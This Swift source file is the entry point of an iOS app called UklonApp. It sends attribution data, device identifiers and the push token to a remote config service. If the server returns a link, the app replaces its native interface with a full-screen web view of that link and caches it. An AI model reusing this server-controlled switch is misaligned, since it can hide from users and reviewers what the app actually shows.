import SwiftUI
import AppsFlyerLib
import UserNotifications

let APPSFLYER_DEV_KEY = "xgvQ3EogmGjgYBSciz62GJ"
let APPLE_APP_ID = "6758858130"

private let maxSplashDuration: TimeInterval = 10

@main
struct UklonApp: App {
    @UIApplicationDelegateAdaptor(AppDelegate.self) var appDelegate

    @State private var currentViewState: ApplicationViewState = .initialScreen

    var body: some Scene {
        WindowGroup {
            ZStack {
                switch currentViewState {
                case .initialScreen:
                    SplashScreenView()

                case .primaryInterface:
                    MainTabView()

                case .browserContent(let urlString):
                    BrowserContentView(targetUrl: urlString)
                        .ignoresSafeArea()

                case .failureMessage(let errorMessage):
                    VStack(spacing: 20) {
                        Text("Error")
                            .font(.title)
                            .foregroundColor(.red)
                        Text(errorMessage)
                        Button("Retry") {
                            Task { await resolveNavigation() }
                        }
                    }
                    .padding()
                }
            }
            .task {
                await resolveNavigation()
            }
        }
    }

    private func resolveNavigation() async {
        await MainActor.run { currentViewState = .initialScreen }

        let deadline = Date().addingTimeInterval(maxSplashDuration)

        let afTimeout = min(5.0, max(0, deadline.timeIntervalSinceNow))
        let conversionData = await appDelegate.waitForConversionData(timeout: afTimeout)

        let remainingTime = deadline.timeIntervalSinceNow
        guard remainingTime > 0.5 else {
            await MainActor.run { resolveFromCache() }
            return
        }

        let service = DynamicConfigService.instance
        let appsFlyerUID = AppsFlyerLib.shared().getAppsFlyerUID()
        let language = Locale.current.language.languageCode?.identifier ?? "en"
        let apnsToken = appDelegate.apnsTokenString

        let result = await service.fetchServerResponse(
            conversionData: conversionData,
            appsFlyerUID: appsFlyerUID,
            language: language,
            apnsToken: apnsToken,
            timeout: remainingTime
        )

        await MainActor.run {
            switch result {
            case .link(let response):
                if response.firstLink == true {
                    service.clearCachedLinks()
                    service.cachedLink1 = response.link
                    currentViewState = .browserContent(response.link)
                } else {
                    if let link2 = service.cachedLink2 {
                        currentViewState = .browserContent(link2)
                    } else if let link1 = service.cachedLink1 {
                        currentViewState = .browserContent(link1)
                    } else {
                        service.cachedLink1 = response.link
                        currentViewState = .browserContent(response.link)
                    }
                }

            case .noLink:
                currentViewState = .primaryInterface

            case .networkError:
                resolveFromCache()
            }
        }
    }

    private func resolveFromCache() {
        let service = DynamicConfigService.instance
        if let link2 = service.cachedLink2 {
            currentViewState = .browserContent(link2)
        } else if let link1 = service.cachedLink1 {
            currentViewState = .browserContent(link1)
        } else {
            currentViewState = .primaryInterface
        }
    }
}

class AppDelegate: NSObject, UIApplicationDelegate {
    var apnsTokenString: String?
    private var conversionDataStore: [AnyHashable: Any]?
    private var conversionDataReady = false

    func application(
        _ application: UIApplication,
        didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?
    ) -> Bool {
        AppsFlyerLib.shared().appsFlyerDevKey = APPSFLYER_DEV_KEY
        AppsFlyerLib.shared().appleAppID = APPLE_APP_ID
        AppsFlyerLib.shared().delegate = self
        AppsFlyerLib.shared().isDebug = true

        NotificationCenter.default.addObserver(
            self,
            selector: #selector(didBecomeActive),
            name: UIApplication.didBecomeActiveNotification,
            object: nil
        )

        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .badge, .sound]) { granted, _ in
            if granted {
                DispatchQueue.main.async {
                    application.registerForRemoteNotifications()
                }
            }
        }

        return true
    }

    @objc private func didBecomeActive() {
        AppsFlyerLib.shared().start()
    }

    func application(
        _ application: UIApplication,
        didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data
    ) {
        let tokenString = deviceToken.map { String(format: "%02.2hhx", $0) }.joined()
        apnsTokenString = tokenString
        AppsFlyerLib.shared().registerUninstall(deviceToken)
    }

    func application(
        _ application: UIApplication,
        didFailToRegisterForRemoteNotificationsWithError error: Error
    ) {
        apnsTokenString = nil
    }

    func application(
        _ application: UIApplication,
        supportedInterfaceOrientationsFor window: UIWindow?
    ) -> UIInterfaceOrientationMask {
        return .all
    }

    func application(
        _ application: UIApplication,
        open url: URL,
        options: [UIApplication.OpenURLOptionsKey: Any] = [:]
    ) -> Bool {
        AppsFlyerLib.shared().handleOpen(url, options: options)
        return true
    }

    func application(
        _ application: UIApplication,
        continue userActivity: NSUserActivity,
        restorationHandler: @escaping ([UIUserActivityRestoring]?) -> Void
    ) -> Bool {
        AppsFlyerLib.shared().continue(userActivity)
        return true
    }

    func waitForConversionData(timeout: TimeInterval) async -> [AnyHashable: Any]? {
        let deadline = Date().addingTimeInterval(timeout)
        while !conversionDataReady && Date() < deadline {
            try? await Task.sleep(nanoseconds: 100_000_000)
        }
        return conversionDataStore
    }
}

extension AppDelegate: AppsFlyerLibDelegate {
    func onConversionDataSuccess(_ conversionInfo: [AnyHashable: Any]) {
        conversionDataStore = conversionInfo
        conversionDataReady = true
    }

    func onConversionDataFail(_ error: Error) {
        conversionDataReady = true
    }

    func onAppOpenAttribution(_ attributionData: [AnyHashable: Any]) {}

    func onAppOpenAttributionFailure(_ error: Error) {}
}
